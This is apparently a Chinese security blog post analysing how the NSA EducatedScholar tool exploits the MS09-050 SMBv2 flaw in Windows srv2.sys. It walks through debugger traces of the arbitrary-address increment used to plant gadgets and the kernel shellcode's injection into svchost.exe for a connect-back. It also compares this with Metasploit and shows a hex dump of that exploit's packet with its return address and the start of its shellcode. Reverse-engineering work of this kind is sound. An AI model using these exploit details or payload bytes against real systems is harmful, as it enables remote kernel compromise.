+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">PAGE:</span>0003097B <span class="comment">; int __stdcall SrvConsumeDataAndComplete(PVOID DestinationBuffer)</span></span><br><span class="line"><span class="symbol">PAGE:</span>0003097B _SrvConsumeDataAndComplete@<span class="number">4</span> proc <span class="built_in">near</span>  <span class="comment">; CODE XREF: SrvProcCompleteRequest(x,x,x)+1E</span></span><br><span class="line"><span class="symbol">PAGE:</span>0003097B</span><br><span class="line"><span class="symbol">PAGE:</span>0003097B DestinationBuffer= <span class="built_in">dword</span> <span class="built_in">ptr</span>  <span class="number">8</span></span><br><span class="line"><span class="symbol">PAGE:</span>0003097B</span><br><span class="line"><span class="symbol">PAGE:</span>0003097B                 <span class="keyword">mov</span>     <span class="built_in">edi</span>, <span class="built_in">edi</span></span><br><span class="line"><span class="symbol">PAGE:</span><span class="number">0003097D</span>                 <span class="keyword">push</span>    <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">PAGE:</span>0003097E                 <span class="keyword">mov</span>     <span class="built_in">ebp</span>, <span class="built_in">esp</span></span><br><span class="line"><span class="symbol">PAGE:</span><span class="number">00030980</span>                 <span class="keyword">mov</span>     <span class="built_in">eax</span>, [<span class="built_in">ebp</span>+DestinationBuffer]</span><br><span class="line"><span class="symbol">PAGE:</span><span class="number">00030983</span>                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">eax</span>+<span class="number">3Ch</span>]</span><br><span class="line"><span class="symbol">PAGE:</span><span class="number">00030986</span>                 <span class="keyword">and</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>+<span class="number">18h</span>], <span class="number">0</span></span><br><span class="line"><span class="symbol">PAGE:</span>0003098A                 <span class="keyword">mov</span>     <span class="built_in">ecx</span>, [<span class="built_in">eax</span>+<span class="number">3Ch</span>]</span><br><span class="line"><span class="symbol">PAGE:</span><span class="number">0003098D</span>                 <span class="keyword">and</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>+<span class="number">1Ch</span>], <span class="number">0</span></span><br><span class="line"><span class="symbol">PAGE:</span><span class="number">00030991</span>                 <span class="keyword">push</span>    <span class="built_in">eax</span>             <span class="comment">; DestinationBuffer</span></span><br><span class="line"><span class="symbol">PAGE:</span><span class="number">00030992</span>                 <span class="keyword">call</span>    _SrvConsumeDataAndComplete2@<span class="number">4</span> <span class="comment">; SrvConsumeDataAndComplete2(x)</span></span><br><span class="line"><span class="symbol">PAGE:</span><span class="number">00030997</span>                 <span class="keyword">pop</span>     <span class="built_in">ebp</span></span><br><span class="line"><span class="symbol">PAGE:</span><span class="number">00030998</span>                 <span class="keyword">retn</span>    <span class="number">4</span></span><br><span class="line"><span class="symbol">PAGE:</span><span class="number">00030998</span> _SrvConsumeDataAndComplete@<span class="number">4</span> endp</span><br></pre></td></tr></table></figure>
+
+<p>那我们把值改回原来的值0xffdf0908再调试 </p>
+<h2 id="判断目标系统版本信息"><a href="#判断目标系统版本信息" class="headerlink" title="判断目标系统版本信息"></a>判断目标系统版本信息</h2><p>协商后，发送SMB Command: Session Setup AndX (0x73)包</p>
+<p><img src="http://pic.giantbranch.cn/1503974094851.jpg" alt="发送SMB Command: Session Setup AndX (0x73)包"></p>
+<p>然后服务器就怪怪返回了信息了（SMB Command: Session Setup AndX (0x73)）</p>
+<p><img src="http://pic.giantbranch.cn/1503974253251.jpg" alt="服务器返回信息"></p>
+<p>两个的command都是0x73，怎么判断哪个是request，那个是response呢？原来在flags里（request是0，response是1）</p>
+<p><img src="http://pic.giantbranch.cn/1503974330638.jpg" alt="flags"></p>
+<p>后面两个包用意不知如何</p>
+<ol>
+<li>Tree Connect AndX Request (0x75)       Path: \192.168.52.145\IPC$</li>
+<li>NT Create AndX Request (0xa2)     File Name: browser</li>
+</ol>
+<h2 id="判断漏洞是否存在（存疑）"><a href="#判断漏洞是否存在（存疑）" class="headerlink" title="判断漏洞是否存在（存疑）"></a>判断漏洞是否存在（存疑）</h2><p>下面仅为猜测，调试的时候是下面路径，但是调试的时候的NewIrql指向的并不是SMB的数据</p>
+<p><img src="http://pic.giantbranch.cn/1503976601899.jpg" alt></p>
+<p><img src="http://pic.giantbranch.cn/1503976723860.jpg" alt=" "></p>
+<p>最后下面这个条件也不满足就直接退出了</p>
+<p><img src="http://pic.giantbranch.cn/1503987825905.jpg" alt></p>
+<p>后来跟导师沟通，知道是处理Process ID High的时候导致一个错误的返回值从而进入错误流程<br>下面为Smb2ValidateProviderCallback函数尾部截图<br><img src="http://pic.giantbranch.cn/1504228019984.jpg" alt></p>
+<p>最终不等于0xC0000016，进入了错误流程</p>
+<p><img src="http://pic.giantbranch.cn/1504228065144.jpg" alt></p>
+<h2 id="利用对任意地址-1的操作写入gadgets"><a href="#利用对任意地址-1的操作写入gadgets" class="headerlink" title="利用对任意地址+1的操作写入gadgets"></a>利用对任意地址+1的操作写入gadgets</h2><p>利用的指令如下</p>
+<p><img src="http://pic.giantbranch.cn/1503909773193.jpg" alt="对地址执行+1操作代码"></p>
+<p>通过发一个包对目标地址+1，写入如下gadgets</p>
+<p><img src="http://pic.giantbranch.cn/1503992118894.jpg" alt></p>
+<p>下面以一个包为例子说明写入经过的流程</p>
+<p>首先包传进来给srv2!SrvProcessPacket处理，其中NewIrql指向SMB数据，也即下面截图中的esi</p>
+<p><img src="http://pic.giantbranch.cn/1503988843352.jpg" alt></p>
+<p><img src="http://pic.giantbranch.cn/1503988962590.jpg" alt></p>
+<p>下面这个就是else，调用SrvConsumeDataAndComplete</p>
+<p><img src="http://pic.giantbranch.cn/1503988983777.jpg" alt></p>
+<p>SrvConsumeDataAndComplete又调用了调用SrvConsumeDataAndComplete2，其实就是将一些偏移置0</p>
+<p><img src="http://pic.giantbranch.cn/1503989042114.jpg" alt></p>
+<p>接下来开始是顺序执行</p>
+<p><img src="http://pic.giantbranch.cn/1503989303596.jpg" alt></p>
+<p><img src="http://pic.giantbranch.cn/1503989359410.jpg" alt></p>
+<p><img src="http://pic.giantbranch.cn/1503989470040.jpg" alt></p>
+<p>我们看看LABEL_56是什么，原来是刚刚调过的那个if里面最后的一小段</p>
+<p><img src="http://pic.giantbranch.cn/1503989506664.jpg" alt></p>
+<p>那我们继续跟看看，原来调用了这里</p>
+<p><img src="http://pic.giantbranch.cn/1503989630145.jpg" alt></p>
+<p>其实在这里面还可以跟</p>
+<p><img src="http://pic.giantbranch.cn/1503989750765.jpg" alt></p>
+<p>我们看看 LABEL_13</p>
+<p><img src="http://pic.giantbranch.cn/1503989843803.jpg" alt></p>
+<p>继续，就到下面的+1操作了</p>
+<p><img src="http://pic.giantbranch.cn/1503989998649.jpg" alt></p>
+<p>这里可能看得有点问题，看汇编好看一点</p>
+<p><img src="http://pic.giantbranch.cn/1503990033795.jpg" alt></p>
+<p>就这样完成了对任意地址+1的操作，过程真是漫长</p>
+<p>最终写如效果如下</p>
+<p><img src="http://pic.giantbranch.cn/1503992118894.jpg" alt></p>
+<p>总结一下，就是通过控制某些偏移，控制if。整个过程如下：</p>
+<p>SrvProcessPacket—&gt;SrvProcCompleteRequest—&gt;SrvConsumeDataAndComplete—&gt;SrvConsumeDataAndComplete2—&gt;SrvProcCompleteRequest—&gt;SrvProcPartialCompleteCompoundedRequest</p>
+<h2 id="最后一个包利用漏洞分析"><a href="#最后一个包利用漏洞分析" class="headerlink" title="最后一个包利用漏洞分析"></a>最后一个包利用漏洞分析</h2><p>可以从下面看到调用轨迹跟上面一样</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; ba e1 <span class="number">0xffdf0908</span></span><br><span class="line">kd&gt; <span class="built_in">bl</span></span><br><span class="line"> <span class="number">0</span> e ffdf0908 e <span class="number">1</span> <span class="number">0001</span> (<span class="number">0001</span>) </span><br><span class="line"></span><br><span class="line">kd&gt; g</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line">ffdf0908 <span class="number">46</span>              <span class="keyword">inc</span>     <span class="built_in">esi</span></span><br><span class="line">kd&gt; kv</span><br><span class="line">ChildEBP RetAddr  Args to Child              </span><br><span class="line"><span class="symbol">WARNING:</span> Frame <span class="built_in">IP</span> <span class="keyword">not</span> <span class="keyword">in</span> any known module. Following frames may be wrong.</span><br><span class="line">8f4e9cc8 97dc8b93 8c5cb0e8 8c5cb128 <span class="number">00000000</span> <span class="number">0xffdf0908</span></span><br><span class="line">8f4e9ce8 97dc996f 8c5cb0e8 <span class="number">00000000</span> <span class="number">00000001</span> srv2!SrvProcCompleteRequest+<span class="number">0xd4</span> (FPO: [Non-Fpo])</span><br><span class="line">8f4e9d10 97dc9997 3fffffe6 8f4e9d34 97dc8ae2 srv2!SrvConsumeDataAndComplete2+<span class="number">0x35e</span> (FPO: [Non-Fpo])</span><br><span class="line">8f4e9d1c 97dc8ae2 8c5cb0e8 8c5cb0e8 97dc7300 srv2!SrvConsumeDataAndComplete+<span class="number">0x1c</span> (FPO: [Non-Fpo])</span><br><span class="line">8f4e9d34 97dc8ab4 8c5cb0e8 81b0e110 97dc7300 srv2!SrvProcCompleteRequest+<span class="number">0x23</span> (FPO: [Non-Fpo])</span><br><span class="line">8f4e9d50 97dc719f 8bdfa3f0 <span class="number">00000000</span> 8add31f8 srv2!SrvProcessPacket+<span class="number">0x88</span> (FPO: [Non-Fpo])</span><br><span class="line">8f4e9d7c 81be1a1c <span class="number">00000000</span> bed8d496 <span class="number">00000000</span> srv2!SrvProcWorkerThread+<span class="number">0x19a</span> (FPO: [Non-Fpo])</span><br><span class="line">8f4e9dc0 81a3aa3e 97dc7005 8add3ca0 <span class="number">00000000</span> nt!PspSystemThreadStartup+<span class="number">0x9d</span></span><br><span class="line"><span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> nt!KiThreadStartup+<span class="number">0x16</span></span><br></pre></td></tr></table></figure>
+
+<p>下面给出最后一次调用srv2!SrvProcCompleteRequest的流程</p>
+<p><img src="http://pic.giantbranch.cn/1503992828433.jpg" alt></p>
+<h2 id="shellcode分析"><a href="#shellcode分析" class="headerlink" title="shellcode分析"></a>shellcode分析</h2><p><img src="http://pic.giantbranch.cn/1503911314234.jpg" alt="通过上面写入的gadgets将eip控制到了可控区域：SMB数据那里"></p>
+<p><img src="http://pic.giantbranch.cn/1503911456518.jpg" alt="之后巧妙妙地跳过垃圾代码"></p>
+<p>最后就到达真正的shellcode处了</p>
+<p><img src="http://pic.giantbranch.cn/1503993305829.jpg" alt></p>
+<p>下面一步步跟一下shellcode</p>
+<p><img src="http://pic.giantbranch.cn/1503994118901.jpg" alt="这还是一个小跳转"></p>
+<p><img src="http://pic.giantbranch.cn/1503995339000.jpg" alt="上面应该是8c69a2a8，写错了"></p>
+<p>就跳到下面来</p>
+<p><img src="http://pic.giantbranch.cn/1503995387570.jpg" alt></p>
+<p>之后又跳转了，很多干扰</p>
+<p><img src="http://pic.giantbranch.cn/1503995521911.jpg" alt></p>
+<p>之后又是一个call，又跳回来</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8</span><span class="keyword">c</span><span class="number">69</span>a<span class="number">605</span> e<span class="number">8</span>b<span class="number">2</span>fcffff      <span class="keyword">call</span>    <span class="number">8</span><span class="keyword">c</span><span class="number">69</span>a<span class="number">2</span>bc</span><br></pre></td></tr></table></figure>
+
+<p>之后有一段寻找内存值为905A4Dh的，一开是不知道是什么</p>
+<p><img src="http://pic.giantbranch.cn/1503996385800.jpg" alt></p>
+<p>仔细一看，原来是PE文件头，后来发下你个地址每次的装载地址都不变，lm看了一下是ntkrpamp.exe这个模块的空间，这个应该是很重要的东西，</p>
+<p>跟着通过上面ntkrpamp.exe这个找到很多内核的api地址</p>
+<p><img src="http://pic.giantbranch.cn/1503998000920.jpg" alt="我看应该是类似于导出表"></p>
+<p>后来看到<code>nt!_imp__VidBitBlt</code> 正好指向上面的pe文件头，这个好像没啥用。。。</p>
+<p>再后来就精彩了，既然找到api函数地址了，就开始调用了</p>
+<p>首先nt!ExAllocatePool申请内存， (复制将要执行的汇编代码到这个申请的内存)</p>
+<p>之后调用nt!PsGetCurrentProcess</p>
+<p>接下来是一个循环查找svchost.exe，attach上去再detach，不断循环<br>找到后进行如下操作：</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">nt!KeStackAttachProcess(attach上去)</span><br><span class="line"></span><br><span class="line">通过独特的算法（<span class="keyword">xor</span>，<span class="keyword">add</span>等运算后和一个常量比较）寻找svchost.exe这个进程，attach上去</span><br><span class="line"></span><br><span class="line">之后nt!ZwAllocateVirtualMemory分配内存</span><br><span class="line"></span><br><span class="line">nt!PsGetCurrentThread</span><br><span class="line"></span><br><span class="line">通过nt!KeServiceDescriptorTable索引（<span class="built_in">eax</span>+12C）---&gt;</span><br><span class="line">8be067a8 8b802c010000    <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>+<span class="number">12Ch</span>]</span><br><span class="line">8be067ae 8b00            <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>]  <span class="built_in">ds</span>:<span class="number">0023</span>:81b43b00=81ac4970</span><br><span class="line">8be067b0 8b80f8050000    <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">eax</span>+<span class="number">5F8h</span>]</span><br><span class="line">8be067b6 <span class="number">894724</span>          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">edi</span>+<span class="number">24h</span>],<span class="built_in">eax</span></span><br><span class="line"></span><br><span class="line">nt!ObGetObjectSecurity+<span class="number">0x1cb6</span></span><br><span class="line">之后nt!HalPrivateDispatchTable</span><br><span class="line"></span><br><span class="line">之后nt!memset了两次，置<span class="number">0</span>后重新复制</span><br><span class="line">最后</span><br><span class="line">KeUnstackDetachProcess</span><br><span class="line">nt!ExFreePool</span><br></pre></td></tr></table></figure>
+
+<p>最后回到nt!KeRemoveQueue，就启动了svchost尝试连接攻击者，怎么启动连接的还没搞清楚 </p>
+<h2 id="与msf的简单对比"><a href="#与msf的简单对比" class="headerlink" title="与msf的简单对比"></a>与msf的简单对比</h2><p>发送的数据如下(AAAA后面的是返回地址，再之后就是加密的payload，payload部分没有全部展示出来)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">8c69f530 ff 53 4d 42 72 00 00 00 00 18 53 c8 17 02 00 e9  .SMBr.....S.....</span><br><span class="line">8c69f540 58 01 00 00 00 00 00 00 00 00 00 00 00 00 8c 6e  X..............n</span><br><span class="line">8c69f550 00 7b 03 02 04 0d df ff 04 0d df ff 04 0d df ff  .&#123;..............</span><br><span class="line">8c69f560 04 0d df ff 04 0d df ff 04 0d df ff 04 0d df ff  ................</span><br><span class="line">8c69f570 04 0d df ff 04 0d df ff 04 0d df ff 04 0d df ff  ................</span><br><span class="line">8c69f580 04 0d df ff 04 0d df ff 04 0d df ff 04 0d df ff  ................</span><br><span class="line">8c69f590 04 0d df ff 04 0d df ff 04 0d df ff 04 0d df ff  ................</span><br><span class="line">8c69f5a0 04 0d df ff 04 0d df ff 04 0d df ff 04 0d df ff  ................</span><br><span class="line">8c69f5b0 04 0d df ff 04 0d df ff 00 02 53 4d 42 20 32 2e  ..........SMB 2.</span><br><span class="line">8c69f5c0 30 30 32 00 00 00 00 00 00 00 00 00 00 00 00 00  002.............</span><br><span class="line">8c69f5d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">8c69f5e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">8c69f5f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">8c69f600 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">8c69f610 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">8c69f620 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">8c69f630 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">8c69f640 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................</span><br><span class="line">8c69f650 00 00 00 00 00 00 00 00 ff ff ff ff ff ff ff ff  ................</span><br><span class="line">8c69f660 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB</span><br><span class="line">8c69f670 42 42 42 42 42 42 42 42 42 42 42 42 b4 ff ff 3f  BBBBBBBBBBBB...?</span><br><span class="line">8c69f680 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA</span><br><span class="line">8c69f690 41 41 41 41 41 41 41 41 09 0d d0 ff fc fa eb 1e  AAAAAAAA........</span><br><span class="line">8c69f6a0 5e 68 76 01 00 00 59 0f 32 89 46 5d 8b 7e 61 89  ^hv...Y.2.F].~a.</span><br><span class="line">8c69f6b0 f8 0f 30 b9 16 02 00 00 f3 a4 fb f4 eb fd e8 dd  ..0.............</span><br><span class="line">8c69f6c0 ff ff ff 6a 00 9c 60 e8 00 00 00 00 58 8b 58 54  ...j..`.....X.XT</span><br><span class="line">8c69f6d0 89 5c 24 24 81 f9 de c0 ad de 75 10 68 76 01 00  .\$$......u.hv..</span><br><span class="line">8c69f6e0 00 59 89 d8 31 d2 0f 30 31 c0 eb 31 8b 32 0f b6  .Y..1..01..1.2..</span><br><span class="line">8c69f6f0 1e 66 81 fb c3 00 75 25 8b 58 5c 8d 5b 69 89 1a  .f....u%.X\.[i..</span><br><span class="line">8c69f700 b8 01 00 00 80 0f a2 81 e2 00 00 10 00 74 0e ba  .............t..</span><br><span class="line">......</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p>之后利用下面的代码对smb数据的第一个dword+1操作（之后漏洞利用的时候有用）</p>
+<p><img src="http://pic.giantbranch.cn/1504080281135.jpg" alt></p>
+<p>结果如下(0xff+1=0x00    进位，所以后面也要加1，    0x53+1=0x54)</p>
+<p><img src="http://pic.giantbranch.cn/1504080316813.jpg" alt></p>
+<p>利用的位置有点不一样，但大同小异（v36也是1，这是必须保证的）</p>
+<p><img src="http://pic.giantbranch.cn/1504080657731.jpg" alt></p>
+<p>之后就直到漏洞利用处，流程相对简单</p>
+<p><img src="http://pic.giantbranch.cn/1504080803381.jpg" alt></p>
+<p>对于开始的前两字节的写入，说明如下：</p>
+<p>利用漏洞将返回地址处</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">97dc8b91 ffd0            <span class="keyword">call</span>    <span class="built_in">eax</span> &#123;ffd00d09&#125;</span><br></pre></td></tr></table></figure>
+
+<p>那里是一个pop esi  ret    //kernels HAL memory region …no ASLR</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; g</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line">ffd00d09 <span class="number">5</span>e              pop     esi</span><br><span class="line">kd&gt; t</span><br><span class="line">ffd00d0a c3              ret</span><br><span class="line">kd&gt; t</span><br><span class="line"><span class="number">8</span>c69f530 <span class="number">00544</span>d42        add     byte ptr [ebp+ecx*<span class="number">2</span>+<span class="number">42</span>h],dl</span><br><span class="line">kd&gt; dc <span class="number">8</span>c69f530 </span><br><span class="line"><span class="number">8</span>c69f530  <span class="number">424</span>d5400 <span class="number">00000072</span> c8531800 e9000217  .TMBr.....S.....</span><br><span class="line"><span class="number">8</span>c69f540  <span class="number">00000158</span> <span class="number">00000000</span> <span class="number">00000000</span> e6540000  X.............T.</span><br><span class="line"><span class="number">8</span>c69f550  <span class="number">02037</span>b00 ffdf0d04 ffdf0d04 ffdf0d04  .&#123;..............</span><br><span class="line"><span class="number">8</span>c69f560  ffdf0d04 ffdf0d04 ffdf0d04 ffdf0d04  ................</span><br><span class="line"><span class="number">8</span>c69f570  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">97</span>dacc1f <span class="number">8</span>c69f530  ............<span class="number">0.</span>i.</span><br><span class="line"><span class="number">8</span>c69f580  <span class="number">97</span>dac57a <span class="number">00000000</span> ffdf0d04 ffdf0d04  z...............</span><br><span class="line"><span class="number">8</span>c69f590  ffdf0d04 ffdf0d04 ffdf0d04 ffdf0d04  ................</span><br><span class="line"><span class="number">8</span>c69f5a0  ffdf0d04 ffdf0d04 ffdf0d04 ffdf0d04  ................</span><br></pre></td></tr></table></figure>
+
+<p>从上可以看到跳到了smb数据开始处，正是开始的修改起了作用，利用得非常秒</p>
+<p><img src="http://pic.giantbranch.cn/1504081322701.jpg" alt></p>
+<p>最后就是真正地执行shellcode了，比NSA简单多了</p>
+<p><img src="http://pic.giantbranch.cn/1504081460689.jpg" alt></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
+<li><p>在NSA的工具中利用了两个漏洞，一个是对任意地址+1的操作，另一个是逻辑漏洞，没有对数据进行校验，就直接call了</p>
+</li>
+<li><p>当时傻傻地跟，由于对 lock xadd 指令不熟悉，所以对其印象深刻，后来看看NSA工具的输出，为什么发那么多包，回想一下应该这个指令+1操作了，后来对地址下写入断点确认了</p>
+</li>
+<li><p>猜想：搞那么长调用路径，目标应该是使SrvProcCompleteRequest的第3个参数为1，从而执行call eax</p>
+</li>
+<li><p>NSA整个漏洞利用的过程：</p>
+<ol>
+<li>先探测目标系统的版本信息</li>
+<li>判断该目标是否存在</li>
+<li>利用对任意地址+1的操作写入gadgets，最后利用逻辑漏洞跳到gadgets处利用漏洞</li>
+</ol>
+</li>
+<li><p>shellcode很多坑，很能抗静态分析，相对复杂，基本只能动态跟</p>
+</li>
+</ol>
+<p><strong>一些小问题：</strong></p>
+<ol>
+<li>一开始直接下断还断不下来，应该是因为那里初始的时候还不是代码，ba e1比较好</li>
+<li>搭建环境挺浪费时间的</li>
+</ol>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>自愿打赏专区</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="http://paypic.giantbranch.cn/wechat.png" alt="giantbranch 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="http://paypic.giantbranch.cn/alipay.png" alt="giantbranch 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+    
+      <div class="footer-custom">
+        <b>paypal: <a href="https://www.paypal.me/giantbranch">https://www.paypal.me/giantbranch</a> </b>
+      </div>
+    
+
+    
+    <div style="padding: 10px 0; margin: 20px auto; width: 100%; text-align: center;">
+    	<div><img src="http://paypic.giantbranch.cn/ask.png"></div>
+    </div>
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    giantbranch
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://www.giantbranch.cn/2017/08/26/Educatedscholar利用的漏洞ms09-050分析及其利用的shellcode分析及与msf利用对比/" title="Educatedscholar利用的漏洞ms09-050分析及其利用的shellcode分析及与msf利用对比">https://www.giantbranch.cn/2017/08/26/Educatedscholar利用的漏洞ms09-050分析及其利用的shellcode分析及与msf利用对比/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/漏洞分析/" rel="tag"># 漏洞分析</a>
+          
+            <a href="/tags/nsa工具/" rel="tag"># nsa工具</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/08/24/内核缓冲区溢出学习之第一个内核缓冲区溢出提权/" rel="next" title="内核缓冲区溢出学习之第一个内核缓冲区溢出提权">
+                <i class="fa fa-chevron-left"></i> 内核缓冲区溢出学习之第一个内核缓冲区溢出提权
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/08/31/翻译——在windbg的帮助下解剖.NET/" rel="prev" title="翻译——在windbg的帮助下解剖.NET">
+                翻译——在windbg的帮助下解剖.NET <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+    <div class="footer-custom">
+	<b>假如你看不到评论，可能是你访问Disqus被墙了，请使用代理访问</b>
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+  
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
